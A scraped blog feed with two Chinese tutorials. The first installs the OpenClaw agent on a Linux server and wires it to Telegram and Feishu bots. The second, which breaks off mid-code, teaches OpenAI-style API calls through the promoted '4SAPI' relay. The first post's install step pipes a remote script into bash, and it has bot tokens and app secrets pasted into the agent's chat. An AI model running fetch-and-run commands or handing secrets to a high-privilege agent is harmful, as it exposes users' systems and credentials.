<p>一条命令就能安装，安装是最简单的步骤。</p>
<p>bash</p>
<pre><code class="hljs language-arduino" lang="arduino">curl -fsSL https:<span class="hljs-comment">//openclaw.ai/install.sh | bash</span>
</code></pre>
<p>这一步会稍微耗费一些时间，需要安装环境，但是aws 非常快，2分钟以内完成。</p>
<p>接着，开始进行快速配置。</p>
<p>第一项选yes，然后选择 QuickStart。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7b20e487058b442987e56f4b6d23a148~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770616694&amp;x-signature=XAw1MFdNgzgeElNonyYidAty8X4%3D" alt="" loading="lazy"/></p>
<p>这一步没办法偷懒了，你必须有个可用的key，比如Google、OpenAI的，或者miniMax、kimi的coding plan 也可以，总之，这一步没办法白嫖的。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/74dcf0a8f5ef42729d926ad04c3ca5e7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770616694&amp;x-signature=jHlLQR98XgnwWJwkArfygIrVnaY%3D" alt="" loading="lazy"/></p>
<p>我选择了 Google，然后选择 Gemini 3。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/83c4781257af4fb1ae66b9be4abe8cfe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770616694&amp;x-signature=CXfwZFMtCi%2FGq6trCdlxIf%2BOZfk%3D" alt="" loading="lazy"/></p>
<p>这一步选择 Bot 的，先跳过。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4b63fe911a8b45bbb0d8e26001fd8d22~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770616694&amp;x-signature=YMhbiSM8buEivGVIdM9Wd1NTgKU%3D" alt="" loading="lazy"/></p>
<p>这些 Skill 可以选择性安装，也可以跳过等着后面安装。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8d3b00bc191943c1ac5f33d4b1e62373~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770616694&amp;x-signature=hORTEJVZfeQy42QKbi8X1ghofvs%3D" alt="" loading="lazy"/></p>
<p>下面这几项全选择 No 就好了。</p>
<p>Enable hooks 可以全选上，按空格选中，按回车确定下一步。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c45b370360234e8abf39507ecdf3f1c9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770616694&amp;x-signature=5vCzxob21o22yjTQeWNgWWMy2m8%3D" alt="" loading="lazy"/></p>
<p>点击会车后，稍等几秒，就安装完成了。</p>
<p>因为是在Linux中，没有浏览器，所以使用 Tui 方式操作。</p>
<p>安装完成后就可以直接选择 Tui ，或者使用 <code>openclaw tui</code>打开。</p>
<p>打开 Tui 模式后，随便输入点儿内容，如果正常返回就说明安装成功了，顺利的话2、3分钟就完事儿了。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/efcee2ed5e5e46568787a24cc6186ee2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770616694&amp;x-signature=y1DDqgRWPt3h09WmoWIJEWe1q8w%3D" alt="" loading="lazy"/>添加Telegram机器人</p>
<p>接下来，最简单的就是集成 Telegram 机器人了。添加好以后，就可以通过聊天的方式控制 OpenClaw 了。</p>
<p>打开  Telegram，搜索<code>BotFather</code>，认准了，看清楚名称要是 @BotFather 的这个，这个就是用来快速创建机器人的。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fec4cfec583e4b69a46aee2b05e19d7b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770616694&amp;x-signature=dTjWRPN1xugXM%2BMfpeNo7ZWKIXA%3D" alt="" loading="lazy"/></p>
<p>在对话中输入 <code>/newbot</code>，会返回消息，让你输入名称。起一个名字输入进去，回车，接着会让你输入一个 <code>username</code>，相当于昵称了，接着输入昵称（以bot结尾），昵称有可能已经被占用了，不符合就接着输入新的。</p>
<p>直到出现下面的回复，表示创建成功了。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ce17d018049245a2a6129fa58b3d8f4b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770616694&amp;x-signature=g9ruSt%2FzqVXCeFOk8caogT7A708%3D" alt="" loading="lazy"/></p>
<p>接下来到重点了，看上图红框中的这部分，这是用来接入你的机器人的。</p>
<p>怎么做呢？很简单，直接复制下来，然后在刚才的 OpenClaw tui 对话框中粘贴进来，告诉它，这是tg创建机器人后返回的 token。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/492551783e9f4881b3402a3100384e2a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770616694&amp;x-signature=KPEdxnEO7FrqGiXg19Wk6hTJJkU%3D" alt="" loading="lazy"/></p>
<p>然后 OpenClaw 自己就知道要干什么了。看下面的信息，机器人已配置好了，正在重启，但是还需要发一条消息，进行一个配对。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a721755dd3e1483ebe03638ecf28d6af~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770616694&amp;x-signature=BYW5Hv4tDGcvCg%2Fc3ug4tJL8aKg%3D" alt="" loading="lazy"/></p>
<p>这条消息就要在刚刚创建的Telegram机器人中发了，还是在创建机器人的对话框中，看下图红框的部分了吗，直接点这个链接，就能和机器人进行对话了。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f9fd26031eba4c3ea915ffc1f9acb2a1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770616694&amp;x-signature=Y9zkL9XsKuuVB6b8ZiwVfY0L4pM%3D" alt="" loading="lazy"/></p>
<p>随便输入什么都可以。接着，机器人会返回如下图红框的部分。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4edd03afe9644d37a9df7e60f76eaf99~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770616694&amp;x-signature=5K8Y%2Bk7iqJe2tGx%2Bo4a3BK5Gkvk%3D" alt="" loading="lazy"/></p>
<p>将这部分整体复制，然后回到 OpenClaw tui，直接粘贴进去，回车。</p>
<p>看到了吧，连接成功了。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/91f4fdad132142029dc3b761a10c5c09~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770616694&amp;x-signature=Grsces2we3%2F8m8K8havYAW%2BKj7g%3D" alt="" loading="lazy"/></p>
<p>接着在TG机器人聊天窗口，就可以控制 OpenClaw 了。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b677c00c86de44c9b3bd6072be10f9dd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770616694&amp;x-signature=pmVP3s3nD2y7AbgocmpSozMKSFk%3D" alt="" loading="lazy"/>集成飞书机器人</p>
<p>飞书相对来说复杂一点，主要是前期的准备工作有点儿多，而且需要手动操作。</p>
<p>首先打开飞书开放平台，有账号就可以。</p>
<p>地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fopen.feishu.cn%2Fapp" target="_blank" title="https://open.feishu.cn/app" ref="nofollow noopener noreferrer">open.feishu.cn/app</a></p>
<p>点击创建企业自建应用。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/72ffed7bfd444d3c98a6318acaf3c5a8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770616694&amp;x-signature=s5W8cspS8nA25S1DZwINMvUwIH8%3D" alt="" loading="lazy"/></p>
<p>输入名称和描述后，点击机器人这里的「添加」按钮。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0c2f42a35fa5405b8b8af846229019dd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770616694&amp;x-signature=zpSF6Ah2kWgWgVzf4O3qOcp0X4s%3D" alt="" loading="lazy"/></p>
<p>左侧菜单栏会出现机器人菜单。</p>
<p>接下来，进入权限管理页面，将下图中右侧的权限打开，或者参考 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fm1heng%2Fclawdbot-feishu%3Ftab%3Dreadme-ov-file%23%25E4%25B8%25AD%25E6%2596%2587" target="_blank" title="https://github.com/m1heng/clawdbot-feishu?tab=readme-ov-file#%E4%B8%AD%E6%96%87" ref="nofollow noopener noreferrer">github.com/m1heng/claw…</a> 这里，可以开通更多权限，包括管理知识库或云文档能力。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5b8d6681440846398dd625c13494b6f8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770616694&amp;x-signature=WPHOn9%2Fr079GdEkcRIKSH3nJ%2Bb8%3D" alt="" loading="lazy"/></p>
<p>接着在事件与回调页面，在事件配置中，将订阅方式设置为长连接，然后添加下图中的 4个事件。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d7722d1d4a0342ba97a8ce6ab2ee411c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770616694&amp;x-signature=%2BOXfPwbPyCM2fLll4EUvSudzKz4%3D" alt="" loading="lazy"/></p>
<p>然后来到凭证与基础信息，将上面的Client ID 和 Client Secret 先复制到一个位置，稍后会用到。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eef493a1bb6e44989c30948f0e6031f7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770616694&amp;x-signature=pVhB%2BOun7q4hWzpan%2FHRznRxrfA%3D" alt="" loading="lazy"/></p>
<p>接着，点击上方的「查看版本详情」</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6e3be520904b4151b0af79ee99453214~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770616694&amp;x-signature=aWDUfBxrM6uGyxUlYvlVpOSyDA8%3D" alt="" loading="lazy"/></p>
<p>填好版本号和描述，点击保存。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4aab3d2d26874b0e9d50d75ade8cb703~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770616694&amp;x-signature=OegRuQqcokss%2FTuB3FytGdnn6wM%3D" alt="" loading="lazy"/></p>
<p>然后点击确认发布。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/550ce3c131b146d68e1046d1818a8009~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770616694&amp;x-signature=fT69TlTq6mF8qVeC3pMBPp0yLcI%3D" alt="" loading="lazy"/></p>
<p>接着来到 OpenClaw tui 界面。</p>
<p>只需要把下面的内容输入进去，OpenClaw 就会自动给你配置了，注意替换你的 Client ID 和   Client Secret。</p>
<blockquote>
<p>我要用 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fm1heng%2Fclawdbot-feishu" target="_blank" title="https://github.com/m1heng/clawdbot-feishu" ref="nofollow noopener noreferrer">github.com/m1heng/claw…</a> 这个项目将飞书集成进来，我的appId是“前面复制的Client ID”，我的appSecret 是“前面复制的 Client Secret”，而且我使用的是国内版飞书，现在请帮我集成进来吧。</p>
</blockquote>
<p>然后来到飞书，点击左侧搜索框，搜索你刚才创建的应用名称，这个就是你的智能助手了。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/475d6824e8a042c098716ff8c2907aad~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770616694&amp;x-signature=qsoeGdvM9VN3U7YVnG5JOUrfWBc%3D" alt="" loading="lazy"/></p>
<p>然后和他聊天验证一下。随便输入一点内容，如果正常返回就可以用了。如果不正常，直接把错误信息扔给 OpenClaw tui，让他修改就行。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ede23e321f5240c1912bebcb9f65513c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770616694&amp;x-signature=qQWM0T50F8vnRMuHG3F49s3i294%3D" alt="" loading="lazy"/>最后</p>
<p>OpenClaw 就是一个权限很大的程序，他可以在你的机器人上随时待命，就像一个24小时工作的助理一样。</p>
<p>之所以要集成飞书、TG等工具，只是为了随时随地的控制他，直接用终端其实也可以，用浏览器也可以。</p>
<p>但是集成了常用聊天工具后，我们躺着床上、地铁上也可以控制他干活儿了，这是最方便的地方。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Python API 调用保姆级教程：从原理到第一次成功请求（附完整代码）]]></title>    <link>https://juejin.cn/post/7602135278665383988</link>    <guid>https://juejin.cn/post/7602135278665383988</guid>    <pubDate>2026-02-03T03:18:01.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602135278665383988" data-draft-id="7602135278665367604" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" Python API 调用保姆级教程：从原理到第一次成功请求（附完整代码）"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-02-03T03:18:01.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="睁眼看视界"/> <meta itemprop="url" content="https://juejin.cn/user/98277494891632"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             Python API 调用保姆级教程：从原理到第一次成功请求（附完整代码）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/98277494891632/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    睁眼看视界
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T03:18:01.000Z" title="Tue Feb 03 2026 03:18:01 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Python API 调用保姆级教程：从原理到第一次成功请求（附完整代码）</h2>
<p>在当今的软件开发中，<strong>API（应用程序编程接口）</strong> 几乎无处不在。从获取天气数据、支付接口，到调用 ChatGPT 进行对话，一切的核心都是“API 调用”。</p>
<p>很多初学者觉得 API 很高深，但实际上，只要你掌握了**“请求（Request）”<strong>与</strong>“响应（Response）”**这两个核心概念，你就已经迈过了门槛。</p>
<p>本文将以 Python 语言为例，手把手教你如何发起一次标准的 API 调用。为了方便演示和保证连接稳定性，本教程将使用兼容性极佳的 <strong>4SAPI</strong> 接口作为测试环境。</p>
<h3 data-id="heading-1">一、 核心概念：API 到底在做什么？</h3>
<p>在写代码之前，你需要理解 API 交互的四个要素：</p>
<ol>
<li>
<p><strong>Endpoint（端点）</strong> ：你要去哪里取数据？通常是一个 URL（例如 <code>https://api.4sapi.com/v1</code>）。</p>
</li>
<li>
<p><strong>Method（方法）</strong> ：你要做什么？</p>
<ul>
<li><code>GET</code>：查数据（例如：查询余额）。</li>
<li><code>POST</code>：提交数据（例如：发一段话给 AI，让它回复）。</li>
</ul>
</li>
<li>
<p><strong>Headers（请求头）</strong> ：你是谁？通常包含 <code>Authorization</code>（你的 API Key）和 <code>Content-Type</code>（数据格式）。</p>
</li>
<li>
<p><strong>Body（请求体）</strong> ：具体内容是什么？（例如：你的 Prompt 提示词）。</p>
</li>
</ol>
<h3 data-id="heading-2">二、 环境准备</h3>
<p>我们将使用 Python 中最流行的 <code>openai</code> 库来完成这次调用。</p>
<p><strong>为什么不用 <code>requests</code> 库？</strong></p>
<p>虽然 <code>requests</code> 是基础，但在 AI 开发领域，使用官方 SDK 能自动处理重试、JSON 解析等繁琐工作。由于 <strong>4SAPI</strong> 完美兼容 OpenAI 协议，我们可以直接使用这个成熟的库。</p>
<h4 data-id="heading-3">1. 安装库</h4>
<p>打开你的终端（Terminal）或 CMD，输入：</p>
<p>Bash</p>
<pre><code class="hljs">pip install openai
</code></pre>
<h4 data-id="heading-4">2. 获取 API Key</h4>
<p>你需要一个“通行证”。</p>
<ul>
<li>
<p>如果你使用官方 OpenAI，去官网后台。</p>
</li>
<li>
<p><strong>本教程推荐演示环境</strong>：前往 <strong>4SAPI 控制台</strong> 申请一个令牌。</p>
<ul>
<li><em>推荐理由</em>：4SAPI 的网络线路针对国内优化（CN2直连），在调试代码时不会因为网络超时（Timeout）而报错，非常适合新手学习和企业生产环境。</li>
</ul>
</li>
</ul>
<h3 data-id="heading-5">三、 代码实战：编写你的第一个 API 脚本</h3>
<p>新建一个文件 <code>main.py</code>，并将以下代码复制进去。为了让你看懂每一行，我添加了详细的注释。</p>
<p>Python</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> os
<span class="hljs-keyword">from</span> openai <span class="hljs-keyword">import</span> OpenAI

<span class="hljs-comment"># ==========================================</span>
<span class="hljs-comment"># 步骤 1：客户端配置 (Client Configuration)</span>
<span class="hljs-comment"># ==========================================</span>

<span class="hljs-comment"># 初始化客户端</span>
client = OpenAI(
    <span class="hljs-comment"># 【关键配置】</span>
    <span class="hljs-comment"># 这里的 API Key 建议从环境变量读取，或者直接填入你的 4SAPI 令牌</span>
    api_key=<span class="hljs-string">"sk-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"</span>, 
    
    <span class="hljs-comment"># 【核心技巧】</span>
    <span class="hljs-comment"># 将 base_url 指向中转站地址。</span>
    <span class="hljs-comment"># 如果不改这里，代码会默认去连 OpenAI 美国服务器（容易超时）。</span>
    <span class="hljs-comment"># 使用 4SAPI 可以利用其企业级 CN2 线路加速，确保握手成功。</span>
    base_url=<span class="hljs-string">"https://api.4sapi.com/v1"</span> 
)

<span class="hljs-comment"># ==========================================</span>
<span class="hljs-comment"># 步骤 2：构建请求 (Build Request)</span>
<span class="hljs-comment"># ==========================================</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">call_ai_model</span>():
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"&gt;&gt;&gt; 正在发送请求..."</span>)
    
    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment"># 发起 Chat Completions 请求（这是目前最通用的 AI 接口标准）</span>
        response = client.chat.completions.create(
            <span class="hljs-comment"># 指定模型：4SAPI 后端支持映射，你可以填 gpt-4o, claude-3-5-sonnet 等</span>
            model=<span class="hljs-string">"gpt-4o-mini"</span>, 
            
            <span class="hljs-comment"># 消息列表：模拟对话历史</span>
            messages=[
                {<span class="hljs-string">"role"</span>: <span class="hljs-string">"system"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"你是一个Python代码助手，回答要简洁。"</span>},
                {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"请写一个打印 Hello World 的函数"</span>}
            ],
            
            <span class="hljs-comment"># 参数设置</span>
            temperature=<span class="hljs-number">0.7</span>, <span class="hljs-comment"># 创意度：0.7 是比较平衡的值</span>
            stream=<span class="hljs-literal">False</span>     <span class="hljs-comment"># 是否流式输出（初学者建议先设为 False）</span>
        )
        
        <span class="hljs-comment"># ==========================================</span>
        <span class="hljs-comment"># 步骤 3：解析响应 (Parse Response)</span>
        <span class="hljs-comment"># ==========================================</span>
        
        <span class="hljs-comment"># API 返回的是一个复杂的对象，我们需要提取核心内容</span>
        content = response.choices[<span class="hljs-number">0</span>].message.content
        
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"&gt;&gt;&gt; API 调用成功！返回结果如下："</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"-"</span> * <span class="hljs-number">30</span>)
        <span class="hljs-built_in">print</span>(content)
